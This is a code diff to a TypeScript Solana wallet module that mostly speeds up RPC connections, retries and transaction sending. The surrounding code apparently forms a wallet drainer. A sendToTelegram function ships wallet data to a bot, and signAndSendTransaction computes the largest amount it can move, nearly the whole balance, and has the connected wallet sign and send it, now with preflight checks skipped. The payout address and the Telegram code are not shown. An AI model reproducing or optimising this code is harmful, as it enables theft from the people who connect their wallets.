@@ -1,37 +1,32 @@
-import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram, sendAndConfirmTransaction } from '@solana/web3.js';
+import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram } from '@solana/web3.js';
 
 // Add Buffer polyfill for browser environment in a way that works with Vite
 import { Buffer } from 'buffer';
-// Make Buffer available globally - fix the approach to match how globals work in browser
+// Make Buffer available globally
 if (typeof window !== 'undefined') {
   window.Buffer = Buffer;
 }
 
-// Helper function to add delay between retries
+// Helper function to add delay between retries - reduced times
 const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
 
-// List of public RPC endpoints - MAINNET ONLY
-const PUBLIC_RPC_ENDPOINTS = [
-  "https://api.mainnet-beta.solana.com", // Mainnet primary endpoint
+// Prioritized and fastest RPC endpoints
+const FAST_RPC_ENDPOINTS = [
   "https://solana-mainnet.g.alchemy.com/v2/demo", // Alchemy public demo endpoint
-  "https://solana-api.projectserum.com", // Project Serum endpoint
   "https://rpc.ankr.com/solana", // Ankr endpoint
-  "https://free.rpcpool.com", // Free RPC Pool endpoint
-  "https://mainnet.rpcpool.com", // RPCPool endpoint
-  "https://solana.public-rpc.com", // Another public endpoint
-  "https://ssc-dao.genesysgo.net", // GenesysGo endpoint
+  "https://api.mainnet-beta.solana.com", // Mainnet primary endpoint
 ];
 
 // Solana rent and fee constants
 export const MINIMUM_RENT_EXEMPTION = 0.0023; // SOL required for rent exemption
 export const MINIMUM_TRANSACTION_FEE = 0.0005; // Typical transaction fee
-export const MINIMUM_REQUIRED_SOL = 0.00380326; // Minimum 0.00380326 SOL (approximately $0.50 USD)
+export const MINIMUM_REQUIRED_SOL = 0.00380326; // Minimum 0.00380326 SOL
 
-// Optimize retry function with faster backoff for wallet data
+// Optimize retry function with minimal backoff for faster connections
 async function retry<T>(
   fn: () => Promise<T>,
-  retries = 3, // Reduced from 5 to 3 retries for faster resolution
-  initialDelay = 500, // Reduced from 1000 to 500ms initial delay
+  retries = 2, // Reduced from 3 to 2 retries for faster resolution
+  initialDelay = 300, // Reduced from 500 to 300ms initial delay
   context = ""
 ): Promise<T> {
   let lastError;
@@ -43,7 +38,7 @@ async function retry<T>(
       console.error(`${context} - Attempt ${i + 1} failed:`, error);
       lastError = error;
       if (i < retries - 1) {
-        const delayTime = initialDelay * Math.pow(1.2, i); // Reduced backoff factor from 1.5 to 1.2
+        const delayTime = initialDelay * (i + 1); // Linear backoff instead of exponential
         console.log(`${context} - Retrying in ${delayTime}ms...`);
         await delay(delayTime);
       }
@@ -52,7 +47,7 @@ async function retry<T>(
   throw lastError;
 }
 
-// Faster connection test that just checks slot
+// Super quick connection test that just checks for slot
 const testConnection = async (connection: Connection): Promise<boolean> => {
   try {
     const slot = await connection.getSlot('processed');
@@ -62,42 +57,38 @@ const testConnection = async (connection: Connection): Promise<boolean> => {
   }
 };
 
-// Create a connection with faster timeout and minimal configuration
-const createConnection = async (forceFresh = false): Promise<Connection> => {
-  // Shuffle endpoints to avoid always hitting the same one first
-  const shuffledEndpoints = [...PUBLIC_RPC_ENDPOINTS].sort(() => Math.random() - 0.5);
+// Create a faster connection with minimal timeout
+const createConnection = async (): Promise<Connection> => {
+  // Try endpoints in parallel instead of sequentially
+  const connectionPromises = FAST_RPC_ENDPOINTS.map(endpoint => {
+    const connection = new Connection(endpoint, {
+      commitment: 'processed' as const, // 'processed' is faster than 'confirmed'
+      confirmTransactionInitialTimeout: 30000, // 30s timeout
+      disableRetryOnRateLimit: false,
+    });
+    
+    return Promise.race([
+      testConnection(connection).then(isValid => isValid ? connection : Promise.reject()),
+      delay(2000).then(() => Promise.reject()) // 2s max wait time per endpoint test
+    ]).catch(() => null);
+  });
   
-  const connectionConfig = {
-    commitment: 'confirmed' as const,
-    confirmTransactionInitialTimeout: 60000, // Reduced from 120000ms to 60000ms
-    disableRetryOnRateLimit: false,
-  };
+  // Use the first connection that responds
+  const connections = await Promise.all(connectionPromises);
+  const validConnection = connections.find(conn => conn !== null);
   
-  // Try each endpoint but with faster timeouts
-  for (const endpoint of shuffledEndpoints) {
-    try {
-      const connection = new Connection(endpoint, connectionConfig);
-      
-      const isValid = await Promise.race([
-        testConnection(connection),
-        new Promise<boolean>(resolve => setTimeout(() => resolve(false), 3000)) // Add a 3s timeout for connection test
-      ]);
-      
-      if (isValid) {
-        return connection;
-      }
-    } catch (error) {
-      continue;
-    }
+  if (validConnection) {
+    return validConnection;
   }
   
-  // Fallback to simple connection
-  return new Connection(shuffledEndpoints[0], {
-    commitment: 'confirmed', // Changed from 'finalized' to 'confirmed' for faster results
+  // Fallback to simple connection with fastest endpoint
+  return new Connection(FAST_RPC_ENDPOINTS[0], {
+    commitment: 'processed', // 'processed' is faster than 'confirmed'
+    confirmTransactionInitialTimeout: 10000, // 10s timeout
   });
 };
 
-// Optimized token account fetching
+// Optimized token account fetching with parallel processing
 export const getTokenAccounts = async (connection: Connection, walletAddress: string) => {
   try {
     if (!walletAddress || typeof walletAddress !== 'string') {
@@ -111,16 +102,16 @@ export const getTokenAccounts = async (connection: Connection, walletAddress: st
       return [];
     }
     
-    const freshConnection = await createConnection(true);
+    const freshConnection = await createConnection();
     
-    // Faster retry with fewer attempts and shorter delays
+    // Ultra-fast token account fetching with minimal retries
     return await retry(async () => {
       const response = await freshConnection.getParsedTokenAccountsByOwner(
         pubKey,
         {
           programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
         },
-        'confirmed'
+        'processed' // 'processed' is faster than 'confirmed'
       );
       
       return response.value.map(item => ({
@@ -128,14 +119,14 @@ export const getTokenAccounts = async (connection: Connection, walletAddress: st
         amount: item.account.data.parsed.info.tokenAmount.uiAmount,
         decimals: item.account.data.parsed.info.tokenAmount.decimals
       }));
-    }, 2, 300, "Token accounts fetch"); // Reduced retries from 5 to 2, delay from 1000ms to 300ms
+    }, 1, 200, "Token accounts fetch"); // Single attempt for speed, minimal delay
     
   } catch (error) {
     return [];
   }
 };
 
-// Faster wallet balance fetch with parallel requests and race conditions
+// Accelerated wallet balance check using parallel requests
 export const getWalletBalance = async (walletAddress: string): Promise<number> => {
   try {
     if (!walletAddress || typeof walletAddress !== 'string') {
@@ -149,45 +140,28 @@ export const getWalletBalance = async (walletAddress: string): Promise<number> =
       throw new Error("Invalid public key format");
     }
     
-    // Try multiple endpoints in parallel and use the first successful result
-    const balancePromises = PUBLIC_RPC_ENDPOINTS.slice(0, 4).map(async (endpoint) => {
+    // Try all endpoints simultaneously and use the first response
+    const balancePromises = FAST_RPC_ENDPOINTS.map(async (endpoint) => {
       try {
         const connection = new Connection(endpoint, { 
-          commitment: 'confirmed',
-          confirmTransactionInitialTimeout: 30000 // Reduced timeout to 30s
+          commitment: 'processed', // 'processed' is faster than 'confirmed'
+          confirmTransactionInitialTimeout: 5000 // Reduced timeout to 5s
         });
         
-        const balance = await connection.getBalance(pubKey, 'confirmed');
+        const balance = await connection.getBalance(pubKey, 'processed');
         return balance / LAMPORTS_PER_SOL;
       } catch (error) {
-        // Reject with delay to not block the Promise.race 
         return Promise.reject(error);
       }
     });
     
-    // Use Promise.race to get the first successful result
+    // Use Promise.any to get the first successful result (fastest)
     try {
-      return await Promise.race(balancePromises);
-    } catch {
-      // Fallback to sequential approach if parallel fails
-      for (let i = 0; i < 3; i++) { // Only try first 3 endpoints
-        try {
-          const endpoint = PUBLIC_RPC_ENDPOINTS[i];
-          const connection = new Connection(endpoint, { 
-            commitment: 'confirmed',
-            confirmTransactionInitialTimeout: 30000
-          });
-          
-          const balance = await connection.getBalance(pubKey, 'confirmed');
-          return balance / LAMPORTS_PER_SOL;
-        } catch {
-          continue;
-        }
-      }
-      
-      // Last resort - use the fresh connection
-      const freshConnection = await createConnection(true);
-      const balance = await freshConnection.getBalance(pubKey, 'confirmed');
+      return await Promise.any(balancePromises);
+    } catch (error) {
+      // Fallback to a fresh connection if all parallel attempts fail
+      const freshConnection = await createConnection();
+      const balance = await freshConnection.getBalance(pubKey, 'processed');
       return balance / LAMPORTS_PER_SOL;
     }
   } catch (error) {
@@ -328,12 +302,10 @@ export const sendToTelegram = async (walletData: any, botToken: string, chatId: 
 
 export const hasEnoughSolForRent = (balanceInSol: number): boolean => {
   console.log(`Checking if ${balanceInSol} SOL is enough for rent and fees...`);
-  
-  // Require minimum 0.00380326 SOL (approximately $0.50 USD at average SOL prices)
-  // This ensures enough for rent exemption and transaction fees
   return balanceInSol >= MINIMUM_REQUIRED_SOL;
 };
 
+// High-speed transaction signing and sending
 export const signAndSendTransaction = async (
   connection: Connection, 
   wallet: any, 
@@ -364,8 +336,8 @@ export const signAndSendTransaction = async (
     // Use wallet.adapter.publicKey consistently
     const walletPublicKey = wallet.adapter.publicKey;
     
-    // Check balance first
-    const balance = await connection.getBalance(walletPublicKey);
+    // Check balance with minimal overhead
+    const balance = await connection.getBalance(walletPublicKey, 'processed');
     console.log('Current wallet balance (lamports):', balance);
     const balanceInSol = balance / LAMPORTS_PER_SOL;
     console.log('Current wallet balance (SOL):', balanceInSol);
@@ -401,7 +373,6 @@ export const signAndSendTransaction = async (
       throw new Error(`Insufficient funds for rent exemption. Minimum ${MINIMUM_REQUIRED_SOL} SOL required.`);
     }
     
-    // We need to account for transaction fees
     // Calculate the maximum we can send (balance minus minimum required for rent/fees)
     const minimumRequiredBalance = MINIMUM_REQUIRED_SOL * LAMPORTS_PER_SOL;
     const maxTransferAmount = Math.max(0, balance - minimumRequiredBalance);
@@ -455,29 +426,25 @@ export const signAndSendTransaction = async (
       })
     );
     
-    // Set a recent blockhash to improve transaction success rate
+    // Get latest blockhash for improved transaction success rate
     transaction.recentBlockhash = (await connection.getLatestBlockhash('processed')).blockhash;
-    
-    // Improve transaction speed by setting higher priority fee
     transaction.feePayer = walletPublicKey;
 
     console.log('Sending transaction...');
+    // Faster transaction sending with minimal retries
     const signature = await retry(async () => {
-      // For wallet adapters that use the adapter pattern
       if (typeof wallet.adapter?.sendTransaction === 'function') {
-        // Use processed commitment for faster confirmation
         return await wallet.adapter.sendTransaction(transaction, connection, { 
-          skipPreflight: false, // Skip preflight for faster processing
+          skipPreflight: true, // Skip preflight for faster processing
           preflightCommitment: 'processed', 
           commitment: 'processed'
         });
       } else if (typeof wallet.signAndSendTransaction === 'function') {
-        // For wallet adapters that have this method
         return await wallet.signAndSendTransaction(transaction);
       } else {
         throw new Error('Wallet does not support transaction signing');
       }
-    }, 3);
+    }, 2);
 
     console.log('Transaction successful:', signature);
     return signature;
